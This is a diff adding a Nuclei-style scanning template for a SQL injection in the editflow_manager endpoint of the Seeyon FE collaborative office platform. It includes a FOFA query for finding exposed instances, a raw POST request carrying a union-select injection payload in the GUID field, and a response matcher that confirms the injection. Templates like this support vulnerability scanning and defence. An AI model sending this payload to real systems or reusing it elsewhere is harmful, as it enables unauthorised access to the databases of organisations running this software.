@@ -1,0 +1,29 @@
+id: seeyon-fe-oa-editflow_manager-sqli
+
+info:
+  name: "致远互联 FE 协作办公平台 editflow_manager 组件 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="FE协作办公平台" || body="li_plugins_download"
+          致远互联FE协作办公平台为企业提供集成化协同办公解决方案，涵盖团队协作、信息共享及文档管理功能模块。其editflow_manager接口存在SQL注入漏洞，攻击者可通过构造恶意请求获取数据库敏感数据。
+  tags: 致远互联
+
+http:
+- raw:
+  - |
+    POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+
+    option=2&GUID=-1'+union+select+111*222--+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '24642'
